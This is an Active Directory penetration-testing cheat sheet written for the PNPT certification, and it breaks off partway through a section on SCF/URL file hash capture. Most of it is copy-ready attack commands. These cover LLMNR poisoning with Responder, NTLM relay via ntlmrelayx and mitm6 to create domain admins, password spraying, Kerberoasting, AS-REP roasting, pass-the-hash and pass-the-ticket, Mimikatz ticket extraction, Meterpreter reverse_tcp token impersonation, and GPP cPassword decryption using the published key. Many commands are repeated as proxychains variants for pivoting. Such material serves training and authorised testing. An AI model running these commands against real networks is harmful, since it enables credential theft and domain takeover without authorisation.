This is an Active Directory attack techniques cheat sheet for obtaining the PNPT (Practical Network Penetration Tester) certification from TCM Security

The content is organized step by step following the exact same flow used in actual exams and real-world penetration tests

Most commands are written with proxychains versions included, assuming a pivot environment
Since proxychains is TCP-based tunneling, it does not apply to layer 2 broadcast-based attacks such as Responder and mitm6, or to tools that run locally such as hashcat and john. For nmap, only TCP connect scan (-sT -Pn) is available

### [AD Attack Flow]

Active Directory attacks generally follow the flow below

```bash
[External/Internal Network Entry]

Phase 1. Pre-Compromise
  Capture hashes/credentials from the network without credentials
  (LLMNR Poisoning, SMB Relay, IPv6 Takeover ...)

[User Account or Hash Obtained]

Phase 2. Post-Compromise Enumeration
  Map internal AD structure / identify attack paths
  (BloodHound, PowerView, ldapdomaindump ...)

[Attack Target / Path Identified]

Phase 3. Post-Compromise Attack
  Privilege escalation / lateral movement
  (Kerberoasting, Pass-the-Hash, Token Impersonation ...)

[High-Privilege Account or DA Privileges Obtained]

Phase 4. Domain Compromise
  Full takeover of the Domain Controller
  (DCSync, Golden Ticket, NTDS.dit dump ...)

Phase 5. Post-Exploitation & Persistence
  Maintain access / lateral movement / cover tracks
  (Mimikatz, Evil-WinRM, Pivoting ...)
```

In particular, most AD attacks rely on credentials or information from previous phases, so thorough documentation is important

### [Phase 1 : Pre-Compromise]

In the Pre-Compromise phase, the goal is to capture user hashes or credentials while connected to the network without any credentials

### [1-1 : LLMNR / NBT-NS Poisoning]

LLMNR and NBT-NS are protocols where Windows broadcasts a query to the entire local network when DNS fails to resolve a hostname requested by a victim PC

An attacker can respond to this broadcast with a false reply, capturing the authentication hash that is automatically sent the moment the victim attempts to connect, enabling credential capture

**Requirements:**

```bash
-Must be on the same network (LAN)
-Victim must attempt to access a non-existent hostname (e.g. accessing a file share with a typo)
-LLMNR or NBT-NS must be enabled (Windows default: enabled)
```

**Attack Flow + Tools & Commands:**

```bash
(Attack Flow)

1.Victim attempts to access \\FIILESRV (typo)
2.DNS lookup fails
3.LLMNR broadcast sent
4.Attacker Responder responds to "FIILESRV"
5.Victim sends NTLMv2 hash (NTLMv2 hash must be cracked to obtain credentials)
6.Hash captured successfully

---------------------------------------------------------------------

(Tools & Commands)

# Run Responder (basic)
sudo responder -I eth0 -dwv

# Option explanation
# -I eth0  : specify interface
# -d       : DHCP poisoning
# -w       : enable WPAD proxy server
# -v       : verbose output

# Analysis mode (listen only, no response)
sudo responder -I eth0 -A
```

※Hashes captured by Responder can be found at /usr/share/responder/logs/

※Captured NTLMv2 hashes cannot be used directly for PASS-THE-HASH, so you must either crack them to get the plaintext password or relay them via SMB relay

### [1-2 : SMB Relay Attack]

The SMB Relay attack relays the NTLMv2 hash received from LLMNR Poisoning to another machine in real time instead of cracking it directly

Since the challenge value changes every time, it must be relayed in real time — in simple terms, it is a Man-in-the-Middle attack

**Requirements:**

```bash
-A machine with SMB Signing disabled or Not Required must exist
-The captured user must have local admin privileges on the relay target machine
-LLMNR/NBT-NS must be enabled

SMB Signing = server-side packet tampering verification
```

**Attack Flow + Tools & Commands:**

```bash
(Attack Flow)

1. Modify Responder config (turn off SMB/HTTP responses)
2. Run ntlmrelayx.py (specify relay target)
3. Run Responder (acts as hash capturer)
4. Victim sends LLMNR request
5. Responder responds → victim sends hash
6. ntlmrelayx.py relays hash to target machine
7. SAM dump or shell obtained from target machine

--------------------------------------------------------------------------------------------------

(Tools & Commands)

1 - Modify Responder config
# SMB = Off
# HTTP = Off
# (turn off because ntlmrelayx handles it instead)
sudo nano /etc/responder/Responder.conf

2 - Create target list
# Find and save list of machines with SMB Signing disabled
nmap --script=smb2-security-mode.nse -p 445 192.168.1.0/24 | grep -B5 "not required" | grep "Nmap scan report" | awk '{print $NF}' > targets.txt

Step 3 - Run ntlmrelayx.py
# SAM dump mode = dump all account hashes from target server
sudo ntlmrelayx.py -tf targets.txt -smb2support

# Interactive shell mode = dump all account hashes from target server
sudo ntlmrelayx.py -tf targets.txt -smb2support -i

# Command execution mode = run commands directly on target server
sudo ntlmrelayx.py -tf targets.txt -smb2support -c "whoami"

4 - Run Responder
sudo responder -I eth0 -dwv

---------------------------------------------------------------

(proxychains version)

2 - Create target list (TCP connect scan only)
# Find and save list of machines with SMB Signing disabled
proxychains nmap -sT -Pn --script=smb2-security-mode.nse -p 445 10.10.10.0/24 | grep -B5 "not required" | grep "Nmap scan report" | awk '{print $NF}' > targets.txt

Step 3 - Run ntlmrelayx.py
# SAM dump mode = dump all account hashes from target server
proxychains sudo ntlmrelayx.py -tf targets.txt -smb2support

# Interactive shell mode = dump all account hashes from target server
proxychains sudo ntlmrelayx.py -tf targets.txt -smb2support -i

# Command execution mode = run commands directly on target server
proxychains sudo ntlmrelayx.py -tf targets.txt -smb2support -c "whoami"
```

※ Hashes obtained from SAM dump are NT hashes, so PASS-THE-HASH is possible

### [1-3 : IPv6 DNS Takeover (mitm6)]

Windows enables IPv6 by default and prioritizes it over IPv4

If an attacker acts as a fake DHCPv6 server and registers as the network's default DNS server, it becomes possible to create a domain admin account via LDAP relay and take over the DC

**Requirements:**

```bash
1.IPv6 must be enabled on the network (Windows default)
2.LDAP Signing must not be required
3.DC must not have LDAPS (port 636) or have misconfigured settings
```

**Attack Flow + Tools & Commands:**

```bash
(Attack Flow)

1.Run mitm6
2.Victim machine sets IPv6 DNS to attacker = DNS hijacked via fake DHCPv6 server
3.Victim connects to attacker when querying WPAD etc.
4.ntlmrelayx.py relays to DC's LDAP
5.New admin account created or ACL modified , ACL = account permissions list

-------------------------------------------------------------------------

(Tools & Commands)

Terminal 1 - ntlmrelayx.py
# Create domain admin account
sudo ntlmrelayx.py -6 -t ldaps://[DC-IP] -wh fakewpad.domain.local -l loot
# AD CS target = issue domain admin certificate
sudo ntlmrelayx.py -6 -t ldaps://[DC-IP] --delegate-access

Terminal 2 - Run mitm6
sudo mitm6 -d domain.local

---------------------------------------------------------------

(proxychains version)

Terminal 1 - ntlmrelayx.py (when DC is on internal network)
# Create domain admin account
proxychains sudo ntlmrelayx.py -6 -t ldaps://[DC-IP] -wh fakewpad.domain.local -l loot
# AD CS target = issue domain admin certificate
proxychains sudo ntlmrelayx.py -6 -t ldaps://[DC-IP] --delegate-access
```

### [1-4 : Password Spraying]

Password Spraying is an attack that tries one password against multiple accounts to avoid account lockout policies

**Requirements:**

```bash
1.Must have a valid list of usernames
2.Must check password policy first (attempts must stay below lockout threshold)
3.Must know common passwords (season+year, company name, Password1! etc.)
```

**Tools & Commands:**

```bash
(Attack Flow)

1.Check password policy (identify lockout threshold)
2.Collect username list (Kerbrute, enum4linux etc.)
3.Select one common password (e.g. Password2024!)
4.Try the same password against all users
5.Successful account → begin internal enumeration

------------------------------------------------------------------------------------

(Username collection methods)

# Enumerate usernames with Kerbrute (no auth required)
kerbrute userenum -d domain.local --dc [DC-IP] usernames.txt

# enum4linux
enum4linux -U [DC-IP]

# LDAP = company employee directory system (when credentials available)
crackmapexec smb [DC-IP] -u '' -p '' --users

---------------------------------------------------------------------------------------

(Password policy check)

crackmapexec smb [DC-IP] -u [user] -p [pass] --pass-pol

-------------------------------------------------------------------------------------

(Run spray)

# Kerbrute (Kerberos-based, fast)
kerbrute passwordspray -d domain.local --dc [DC-IP] usernames.txt "Password2024!"

# CrackMapExec
crackmapexec smb [DC-IP] -u usernames.txt -p "Password2024!" --continue-on-success

---------------------------------------------------------------

(proxychains version)

# Enumerate usernames with Kerbrute (no auth required)
proxychains kerbrute userenum -d domain.local --dc [DC-IP] usernames.txt
# enum4linux
proxychains enum4linux -U [DC-IP]
# LDAP (when credentials available)
proxychains crackmapexec smb [DC-IP] -u '' -p '' --users
# Password policy check
proxychains crackmapexec smb [DC-IP] -u [user] -p [pass] --pass-pol
# Kerbrute spray (Kerberos-based, fast)
proxychains kerbrute passwordspray -d domain.local --dc [DC-IP] usernames.txt "Password2024!"
# CrackMapExec spray
proxychains crackmapexec smb [DC-IP] -u usernames.txt -p "Password2024!" --continue-on-success
```

### [1-5 : WPAD Attack]

An attack that uses Responder's WPAD feature to create a fake proxy server, tricking the victim's browser into authenticating automatically

**Requirements:**

```bash
1.LLMNR/NBT-NS enabled
2.Victim starts using a web browser
```

**Attack Flow + Tools & Commands:**

```bash
(Attack Flow)

1.Run Responder with -w -F options
2.Victim browser auto-searches for WPAD proxy settings
3.LLMNR broadcasts "WPAD" query
4.Responder responds to "WPAD"
5.Browser requests proxy authentication (-F: forces Basic auth)
6.Plaintext credentials obtained

---------------------------------------------------------------

(Commands)

# -w : enable WPAD server
# -F : force Basic auth (plaintext credentials can be obtained)
sudo responder -I eth0 -wFv
```

### 

### [Phase 2 : Post-Compromise Enumeration]

In Phase 2, the internal enumeration phase, the goal is to map the internal AD structure and establish attack paths

### [2-1 : BloodHound / SharpHound]

BloodHound and SharpHound are tools that collect all relationships in AD (users, groups, computers, ACLs, GPOs etc.) and visualize them as a graph

**Requirements:**

```bash
1.Must have valid domain credentials
2.Must have access to the internal domain
```

**Attack Flow + Tools & Commands:**

```bash
(Attack Flow)

1.Obtain domain user credentials (result of Phase 1)
2.Collect all AD data with SharpHound (ZIP)
3.Transfer ZIP to Kali and import into BloodHound GUI
4.Run "Shortest Path to DA" query
5.Identify attack path → select Phase 3 attack

----------------------------------------------------------------

(Data (zip) collection (SharpHound))

# Run on Windows victim machine
.\SharpHound.exe -c All --domain domain.local --zipfilename bloodhound.zip

# PowerShell version
. .\SharpHound.ps1
Invoke-BloodHound -CollectionMethod All -Domain domain.local -ZipFileName loot.zip

# Remote execution from Kali (when credentials available)
bloodhound-python -u [user] -p [pass] -ns [DC-IP] -d domain.local -c All --zip

---------------------------------------------------------------

(proxychains version)

# Remote execution from Kali (when credentials available)
proxychains bloodhound-python -u [user] -p [pass] -ns [DC-IP] -d domain.local -c All --zip

# Run SharpHound on pivot host then retrieve file
proxychains scp user@[pivot-host]:/path/bloodhound.zip ./

-----------------------------------------------------------------------------

BloodHound GUI analysis

Run Neo4j: sudo neo4j start
Run BloodHound then import ZIP file
Key queries:

"Find Shortest Paths to Domain Admins"
"Find Principals with DCSync Rights"
"List all Kerberoastable Accounts"
"Find Computers where Domain Users are Local Admin"
```

### [2-2 : PowerView]

PowerView is a PowerShell-based AD tool that enables more granular analysis of specific objects and permissions compared to BloodHound

**Requirements:**

```bash
1.Domain user privileges
```

**Attack Flow + Tools & Commands:**

```bash
(Attack Flow)

1.Access Windows machine with domain user account
2.Load PowerView.ps1 (. .\PowerView.ps1)
3.Enumerate all domain users/groups/computers
4.Search for accounts with SPN set → identify Kerberoasting targets
5.Search for accounts with pre-auth disabled → identify AS-REP Roasting targets
6.Find-LocalAdminAccess → get list of machines where I am admin
7.Analyze ACLs → find misconfigured permissions → establish privilege escalation path (misconfigured permissions = accounts with unnecessarily excessive permissions)

--------------------------------------------------------------------------------------------

(Key commands)

# Load module
. .\PowerView.ps1

# Basic domain info
Get-NetDomain
Get-DomainSID

# User enumeration
Get-DomainUser
Get-DomainUser -Identity [username] -Properties *

# Group enumeration
Get-DomainGroup
Get-DomainGroupMember -Identity "Domain Admins"

# Computer enumeration
Get-DomainComputer
Get-DomainComputer -Properties Name,IPv4Address

# Check local admin (find machines where I am admin)
Find-LocalAdminAccess

# Accounts with SPN set (Kerberoasting targets)
Get-DomainUser -SPN

# Accounts with Kerberos pre-auth disabled (AS-REP Roasting targets)
Get-DomainUser -PreauthNotRequired

# ACL analysis
Invoke-ACLScanner -ResolveGUIDs | Where-Object {$_.IdentityReferenceName -match "Domain Users"}

# Share enumeration
Invoke-ShareFinder
```

### [2-3 : ldapdomaindump]

ldapdomaindump is a Python tool that directly queries AD via the LDAP protocol to pull information

**Requirements:**

```bash
1.Valid domain credentials
```

**Attack Flow + Tools & Commands:**

```bash
(Attack Flow)

1.Obtain domain credentials
2.Run ldapdomaindump → generate HTML/JSON files
3.domain_users.html → check user list, admin accounts, description fields
4.domain_groups.html → check DA group members
5.domain_policy.html → check password policy (important for identifying lockout threshold during spraying)
6.Collected information → select targets for subsequent attacks

------------------------------------------------------------------------------------

(Commands)

ldapdomaindump [DC-IP] -u 'domain.local\[user]' -p '[password]' -o ./loot/

# Output files:
# domain_users.html     → all user information
# domain_groups.html    → group information
# domain_computers.html → computer list
# domain_policy.html    → password policy

---------------------------------------------------------------

(proxychains version)

# Output files: domain_users.html / domain_groups.html / domain_computers.html / domain_policy.html
proxychains ldapdomaindump [DC-IP] -u 'domain.local\[user]' -p '[password]' -o ./loot/
```

### [2-4 : CrackMapExec (CME / NetExec)]

CME and NetExec are tools that can scan the entire network using various protocols such as SMB, WinRM, LDAP, and RDP, and support credential testing, information gathering, and command execution

**Requirements:**

```bash
1.Valid credentials or hash
2.Target port must be accessible
```

**Attack Flow + Tools & Commands:**

```bash
(Attack Flow)

1.Obtain credentials or hash
2.Test credentials across the entire network range
3.(Pwn3d!) machines = local admin access available ([+] = login only (Pwn3d!) = local admin privileges)
4.Use --sam / --lsa to dump hashes from those machines
5.Test dumped hashes across the entire network again (Pass-the-Hash)
6.Find more Pwn3d! machines → repeat (hash chain)
7.Obtain DA hash → access DC

-------------------------------------------------------------------------

(Key commands)

# Credential validation
crackmapexec smb 192.168.1.0/24 -u [user] -p [pass] -d domain.local

# Check local admin (Pwn3d! indicator)
crackmapexec smb 192.168.1.0/24 -u [user] -p [pass] --local-auth

# SAM dump
crackmapexec smb [IP] -u [user] -p [pass] --sam

# LSA Secrets dump
crackmapexec smb [IP] -u [user] -p [pass] --lsa

# With hash instead of password (Pass-the-Hash)
crackmapexec smb 192.168.1.0/24 -u [user] -H [NTLM-hash] --local-auth

# Check sessions
crackmapexec smb 192.168.1.0/24 -u [user] -p [pass] --sessions

# Share enumeration
crackmapexec smb [IP] -u [user] -p [pass] --shares

# Execute commands via WinRM
crackmapexec winrm [IP] -u [user] -p [pass] -x 'whoami'

---------------------------------------------------------------

(proxychains version)

# Credential validation
proxychains crackmapexec smb 10.10.10.0/24 -u [user] -p [pass] -d domain.local
# Check local admin (Pwn3d! indicator)
proxychains crackmapexec smb 10.10.10.0/24 -u [user] -p [pass] --local-auth
# SAM dump
proxychains crackmapexec smb [IP] -u [user] -p [pass] --sam
# LSA Secrets dump
proxychains crackmapexec smb [IP] -u [user] -p [pass] --lsa
# With hash instead of password (Pass-the-Hash)
proxychains crackmapexec smb 10.10.10.0/24 -u [user] -H [NTLM-hash] --local-auth
# Check sessions
proxychains crackmapexec smb 10.10.10.0/24 -u [user] -p [pass] --sessions
# Share enumeration
proxychains crackmapexec smb [IP] -u [user] -p [pass] --shares
# Execute commands via WinRM
proxychains crackmapexec winrm [IP] -u [user] -p [pass] -x 'whoami'
```

### [2-5 : enum4linux / rpcclient]

Tools that help enumerate users, groups, and password policies via SMB null sessions or credentials

**Requirements:**

```bash
SMB null session allowed (without credentials) or valid credentials
```

**Attack Flow + Tools & Commands:**

```bash
(Attack Flow)

1.Access DC without credentials or with obtained credentials
2.Collect all information at once with enum4linux -a
3.User list → targets for Password Spraying or Kerberoasting
4.Password policy → identify lockout threshold (important during spraying)
5.Group info → identify DA group members
6.Share list → confirm accessible shares

------------------------------------------------------------

(Commands)

# enum4linux
enum4linux -a [IP]
enum4linux -U [IP]  # users only
enum4linux -P [IP]  # password policy only

# rpcclient (without credentials)
rpcclient -U "" -N [IP]
> enumdomusers      # enumerate users
> enumdomgroups     # enumerate groups
> getdompwinfo      # password policy

# rpcclient (with credentials)
rpcclient -U "domain.local\[user]%[pass]" [IP]

---------------------------------------------------------------

(proxychains version)

# enum4linux
proxychains enum4linux -a [IP]
proxychains enum4linux -U [IP]  # users only
proxychains enum4linux -P [IP]  # password policy only
# rpcclient (without credentials)
proxychains rpcclient -U "" -N [IP]
# rpcclient (with credentials)
proxychains rpcclient -U "domain.local\[user]%[pass]" [IP]
```

### [2-6 : Kerbrute (Username Enumeration)]

Kerbrute is a tool that uses the Kerberos protocol to identify valid usernames without triggering account lockouts

**Requirements:**

```bash
1.Kerberos port (88) on DC must be accessible
2.Must have a username wordlist
```

**Attack Flow + Tools & Commands:**

```bash
(Attack Flow)

1.Prepare username wordlist (common name lists, company name patterns etc.)
2.Filter for valid usernames only with Kerbrute userenum
3.Can be verified without account lockout (uses Kerberos AS-REQ error codes)
4.Obtain valid user list
5.Use as targets for Password Spraying or AS-REP Roasting

-------------------------------------------------------------------------

(Commands)

# Username enumeration
kerbrute userenum -d domain.local --dc [DC-IP] usernames.txt -o valid_users.txt

# Password spray
kerbrute passwordspray -d domain.local --dc [DC-IP] valid_users.txt "Password1"

---------------------------------------------------------------

(proxychains version)

# Username enumeration
proxychains kerbrute userenum -d domain.local --dc [DC-IP] usernames.txt -o valid_users.txt
# Password spray
proxychains kerbrute passwordspray -d domain.local --dc [DC-IP] valid_users.txt "Password1"
```

### [2-7 : GPO/SYSVOL Enumeration]

There is a possibility that encrypted passwords stored via GPP in the past remain in the SYSVOL shared folder, which is readable by all authenticated domain users

※GPP = GPP is a feature that allows administrators to deploy settings to domain-wide PCs (sometimes when creating accounts via GPP, passwords are also configured, and if those settings are saved as XML files in SYSVOL, they can become a vulnerability)

**Requirements:**

```bash
1.Valid domain user credentials
2.Environment where passwords were previously configured via GPP
```

**Attack Flow + Tools & Commands:**

```bash
(Attack Flow)

1.Access SYSVOL with domain user account (all authenticated users can read)
2.Search under SYSVOL\[domain]\Policies for Groups.xml files
3.Find cPassword field
4.Decrypt with gpp-decrypt or CrackMapExec gpp_password module
5.Obtain plaintext password (often a local admin or DA account)
6.Proceed with further attacks using that account

------------------------------------------------------------------

(Commands)

# From Kali
crackmapexec smb [DC-IP] -u [user] -p [pass] -M gpp_password

# From PowerView
Get-GPPPassword

# Manual enumeration
smbclient //[DC-IP]/SYSVOL -U [user]
# Find Groups.xml files
find . -name "Groups.xml" 2>/dev/null

# Decrypt cPassword
gpp-decrypt [cPassword value]

---------------------------------------------------------------

(proxychains version)

# CrackMapExec automated
proxychains crackmapexec smb [DC-IP] -u [user] -p [pass] -M gpp_password
# Manual - enumerate SYSVOL via smbclient
proxychains smbclient //[DC-IP]/SYSVOL -U [user]%[pass]

### [Phase 3 : Post-Compromise Attack]

In the post-compromise attack phase, the main goal is to escalate from the obtained regular user account to higher privileges or get closer to Domain Admin

### [3-1 : Kerberoasting]

Kerberoasting is an attack that requests a TGS ticket for a service account with an SPN (Service Principal Name) set, then cracks the encrypted portion of the ticket offline to obtain the service account password

1.Only service accounts can have SPNs set

2.TGT tickets can be obtained by any regular user

3.With a valid TGT, TGS can be requested for accounts with SPNs set

4.TGS is encrypted with the service account's password hash → can be cracked offline

※TGT (Ticket Granting Ticket) is a ticket issued upon login in the Kerberos authentication system and is used to prove identity when accessing services within the domain

**Requirements:**

```bash
1.Must have domain user credentials (low privileges are fine)
2.A service account with SPN set must exist
3.Most effective when the service account password is weak
```

**Attack Flow + Tools & Commands:**

```bash
(Attack Flow)

1.Log in with domain user account
2.Search for service accounts with SPN set (GetUserSPNs, BloodHound)
3.Request TGS ticket for that service account (legitimate Kerberos request)
4.Extract TGS ticket (contains portion encrypted with service account hash)
5.Crack offline with Hashcat
6.Obtain plaintext service account password
7.Use account for further attacks, or if DA, directly take over the domain

-------------------------------------------------------------------------------------------

(Target account discovery)

# From Kali (Impacket)
GetUserSPNs.py domain.local/[user]:[pass] -dc-ip [DC-IP]

# From PowerView
Get-DomainUser -SPN | Select SamAccountName, ServicePrincipalName

# BloodHound (GUI)
Queries tab → click "List all Kerberoastable Accounts"
→ visualize list of accounts with SPN set

------------------------------------------------------------------------------------------

(Attack execution)

# Extract hash (Impacket)
GetUserSPNs.py domain.local/[user]:[pass] -dc-ip [DC-IP] -request -outputfile kerberoast.txt

# Rubeus (Windows)
.\Rubeus.exe kerberoast /outfile:hashes.txt

---------------------------------------------------------------

(proxychains version)

# Target account discovery (Impacket)
proxychains GetUserSPNs.py domain.local/[user]:[pass] -dc-ip [DC-IP]
# Extract hash (Impacket)
proxychains GetUserSPNs.py domain.local/[user]:[pass] -dc-ip [DC-IP] -request -outputfile kerberoast.txt

------------------------------------------------------------------------------------------------

(Hash cracking)

hashcat -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt
# -m 13100 = Kerberos 5 TGS-REP etype 23

john --wordlist=/usr/share/wordlists/rockyou.txt kerberoast.txt
```

### [3-2 : AS-REP Roasting]

AS-REP Roasting allows requesting a portion of a TGT without a valid password for accounts that have Pre-Authentication disabled

**Requirements:**

```bash
1.An account with "Do not require Kerberos preauthentication" option enabled must exist
2.Attack is possible without authentication, but having credentials allows discovery of more targets
```

**Attack Flow + Tools & Commands:**

```bash
(Attack Flow)

1.Find accounts with pre-auth disabled (PowerView, BloodHound)
2.Send AS-REQ to that account without authentication
3.KDC returns portion of TGT encrypted with account hash (AS-REP)
4.Extract the encrypted portion
5.Crack offline with Hashcat (-m 18200)
6.Obtain account password

------------------------------------------------------------------------

(Target discovery)

# Impacket (without authentication)
GetNPUsers.py domain.local/ -no-pass -usersfile usernames.txt -dc-ip [DC-IP]

# Impacket (with credentials)
GetNPUsers.py domain.local/[user]:[pass] -dc-ip [DC-IP] -request

# PowerView
Get-DomainUser -PreauthNotRequired

---------------------------------------------------------------

(proxychains version)

# Impacket (without authentication)
proxychains GetNPUsers.py domain.local/ -no-pass -usersfile usernames.txt -dc-ip [DC-IP]
# Impacket (with credentials)
proxychains GetNPUsers.py domain.local/[user]:[pass] -dc-ip [DC-IP] -request

-------------------------------------------------------------------------------

(Hash cracking)

hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt
# -m 18200 = Kerberos 5 AS-REP etype 23
```

### [3-3 : Pass-the-Hash (PtH)]

PtH is a technique that uses the NTLM hash to authenticate without a plaintext password

(Hashes obtained from SAM dumps, Mimikatz, etc.)

※NTLMv2 hashes captured by Responder cannot be used

**Requirements:**

```bash
1.Must have NTLM hash (NTLMv2 hashes are not usable, only NTLM hashes)
2.SMB/WinRM etc. must be open on the target machine
3.The account must have local admin or domain admin privileges on the target
```

**Attack Flow + Tools & Commands:**

```bash
(Attack Flow)

1.Obtain NTLM hash from SAM dump or Mimikatz
2.Input hash directly into CrackMapExec / psexec.py
3.Target machine accepts NTLM authentication
4.Obtain shell or command execution privileges
5.Dump additional hashes or perform lateral movement

---------------------------------------------------------

(Attack execution)

# CrackMapExec
crackmapexec smb [IP] -u [user] -H [NTLM-hash] --local-auth

# psexec.py (Impacket)
psexec.py [user]@[IP] -hashes :[NTLM-hash]

# wmiexec.py (Impacket)
wmiexec.py [user]@[IP] -hashes :[NTLM-hash]

# evil-winrm (WinRM)
evil-winrm -i [IP] -u [user] -H [NTLM-hash]

-Format: -hashes [LM hash]:[NT hash]
-If no LM hash, leave it empty with a colon : :[NT hash]

---------------------------------------------------------------

(proxychains version)

# CrackMapExec
proxychains crackmapexec smb [IP] -u [user] -H [NTLM-hash] --local-auth
# psexec.py (Impacket)
proxychains psexec.py [user]@[IP] -hashes :[NTLM-hash]
# wmiexec.py (Impacket)
proxychains wmiexec.py [user]@[IP] -hashes :[NTLM-hash]
# evil-winrm (WinRM)
proxychains evil-winrm -i [IP] -u [user] -H [NTLM-hash]
```

### [3-4 : Pass-the-Ticket (PtT)]

PtT is an attack that extracts Kerberos tickets (TGS or TGT) from memory and reuses them to authenticate against other systems

**Requirements:**

```bash
1.Another user's active session must exist on the system
# Tickets only exist in memory while logged in = tickets disappear when user logs out
# Meaning the user must currently be logged into that PC

2.SYSTEM or administrator privileges required (memory access)
# Tickets are stored in lsass process memory
# lsass is a core Windows process that not just anyone can access
# SYSTEM or admin privileges are required
```

**Attack Flow + Tools & Commands:**

```bash
(Attack Flow)

1. Obtain admin or SYSTEM privileges
2.Check cached Kerberos tickets on current system with klist
3.Extract tickets from memory with Mimikatz / Rubeus (.kirbi)
4.Inject the stolen ticket into the current session (kerberos::ptt)
5.Access network resources with injected ticket privileges

-----------------------------------------------------------------

(Attack execution)

# Extract tickets with Mimikatz (Windows)
1.Run mimikatz.exe
2.privilege::debug (privilege escalation)
3.sekurlsa::tickets /export (extract tickets + save as .kirbi file)
4.kerberos::ptt [filename.kirbi] (inject ticket)
5.klist (verify injection)

# Extract with Rubeus
.\Rubeus.exe dump /nowrap

# Inject ticket (Mimikatz)
mimikatz # kerberos::ptt [ticket.kirbi]

# Inject with Rubeus
.\Rubeus.exe ptt /ticket:[base64-ticket]

# Verify injection
klist
```

### 

### [3-5 : Overpass-the-Hash (OPtH)]

A technique that uses the NTLM hash for Kerberos authentication to obtain a TGT

Checkpoint:

```bash
PtH VS oPtH

PtH and oPtH both use NTLM hashes, but PtH uses NTLM and oPtH uses Kerberos authentication,
making oPtH much more useful than PtH
However, when only local account credentials are available (not domain) or when port 88 (Kerberos) is blocked, only PtH is possible
```

**Requirements:**

```bash
1.Must have NTLM hash
2.Kerberos authentication environment
```

**Attack Flow + Tools & Commands:**

```bash
(Attack Flow)

1.Obtain NTLM hash (SAM dump, Mimikatz etc.)
2.Use NTLM hash as RC4 key to request TGT from KDC
3.KDC issues valid TGT (passes if hash is correct)
4.Can authenticate via Kerberos with the issued TGT
5.Access services within domain (valid even in environments where NTLM is blocked)

-----------------------------------------------------------

(Attack execution)

# Mimikatz
1.Run mimikatz.exe
2.privilege::debug
3.sekurlsa::pth /user:[user] /domain:[domain] /ntlm:[hash] /run:cmd.exe

# Rubeus
.\Rubeus.exe asktgt /user:[user] /rc4:[NTLM-hash] /ptt
```

### 

### [3-6 : Token Impersonation]

Windows normally assigns tokens to running processes, and it is possible to use another user's token to perform actions with that user's privileges

The Token Impersonation attack exploits this by stealing the token from a session opened by a DA to obtain DA privileges

**Requirements:**

```bash
1.Must have local admin or SYSTEM privileges
2.Target user must have an active session or process on the system
```

**Attack Flow + Tools & Commands:**

```bash
(Attack Flow)

1.Access machine with local admin or SYSTEM privileges
2.Check token list on current system with list_tokens -u
3.Find token for DA or high-privilege account
4.Steal that token with impersonate_token
5.whoami → switched to DA privileges
6.Access DC or proceed with further attacks

---------------------------------------------------------------

(Attack execution)

1.msfconsole
2.use exploit/windows/smb/psexec
3.set payload windows/x64/meterpreter/reverse_tcp
4.set RHOSTS [IP]
5.set SMBUser [user]
6.set SMBPass [pass]
7.run

# In Meterpreter
load incognito
list_tokens -u                         # check available tokens
impersonate_token "DOMAIN\\Administrator"  # steal token
shell
whoami

---------------------------------------------------------------

(proxychains version)

# Use setg Proxies inside msfconsole (instead of proxychains command)
1.msfconsole
2.setg Proxies socks5:127.0.0.1:1080  # route to internal network target
3.use exploit/windows/smb/psexec
4.set payload windows/x64/meterpreter/reverse_tcp
5.set RHOSTS [IP]
6.set SMBUser [user]
7.set SMBPass [pass]
8.run
```

### [3-7 : GPP / cPassword Attack (MS14-025)]

※Second mention

The old Group Policy Preferences (GPP) was a feature that allowed administrators to configure local account passwords, service accounts, drive mappings etc. across domain machines in bulk

Passwords were encrypted with AES-256 and stored in SYSVOL, but in 2012 Microsoft publicly disclosed the encryption key on MSDN, making it decryptable by anyone

Microsoft blocked the ability to store new passwords in GPP with the MS14-025 patch in 2014, but files created before the patch may still remain in SYSVOL

**AES decryption key:**

```bash
4e9906e8fcb66cc9faf49310620ffee8f496e806cc057990209b09a433b66c1b
```

**Requirements:**

```bash
1.Must have domain user credentials (SYSVOL is readable by all authenticated users)
2.Environment must be old or have a history of passwords configured via GPP
3.GPP files created before MS14-025 must still remain
```

**Attack Flow + Tools & Commands:**

```bash
(Attack Flow)

1.Access SYSVOL with domain user account (all authenticated users can read)
2.Search entire tree under \\[DC]\SYSVOL\[domain]\Policies
3.Search for cPassword field in Groups.xml, Services.xml etc.
4.Copy cPassword value
5.Decrypt with gpp-decrypt (uses AES key leaked by Microsoft)
6.Obtain plaintext password
7.Often a local Administrator account
8.Spread across entire network via Pass-the-Password or Pass-the-Hash

------------------------------------------------------------------------

(Attack execution)

# CrackMapExec automated (fastest)
crackmapexec smb [DC-IP] -u [user] -p [pass] -M gpp_password

# Metasploit
use post/windows/gather/credentials/gpp

# Manual - enumerate SYSVOL via smbclient
smbclient //[DC-IP]/SYSVOL -U [user]%[pass]
smb: \> recurse on
smb: \> prompt off
smb: \> mget *
1.Download everything locally then search
grep -r "cpassword" .
2.Decrypt with gpp-decrypt
gpp-decrypt [cPassword value]
3.PowerView (on Windows)
Get-GPPPassword
4.Search for specific files with find
find /tmp/sysvol -name "*.xml" | xargs grep -l "cpassword" 2>/dev/null

---------------------------------------------------------------

(proxychains version)

# CrackMapExec automated
proxychains crackmapexec smb [DC-IP] -u [user] -p [pass] -M gpp_password
# Manual - enumerate SYSVOL via smbclient
proxychains smbclient //[DC-IP]/SYSVOL -U [user]%[pass]

-------------------------------------------------------------------------------

(Post-acquisition usage)

# Often a local admin password → spread across entire network
crackmapexec smb 192.168.1.0/24 -u Administrator -p [decrypted password] --local-auth

# Machines showing Pwn3d! → SAM dump → obtain additional hashes
crackmapexec smb [IP] -u Administrator -p [pass] --local-auth --sam

---------------------------------------------------------------

(proxychains version)

# Often a local admin password → spread across entire network
proxychains crackmapexec smb 10.10.10.0/24 -u Administrator -p [decrypted password] --local-auth
# Machines showing Pwn3d! → SAM dump → obtain additional hashes
proxychains crackmapexec smb [IP] -u Administrator -p [pass] --local-auth --sam
```

### [3-8 : URL File / SCF File Attack (Watering Hole)]

An attack that places malicious .url or .scf files in a network share folder so that simply opening the folder in File Explorer automatically sends an NTLM hash to Responder

**Requirements:**

```bash
1.A network share with write permissions must exist
2.Users must be browsing that share
```

**Attack Flow + Tools & Commands:**

```bash
(Attack Flow)

1.Run Responder (wait to receive hash)
2.Find network shares with write access (CrackMapExec --shares)
3.Place @exploit.scf or @exploit.url file in the share
4.Auto-triggered the moment a user opens the folder in File Explorer
5.File requests icon/resource from attacker IP
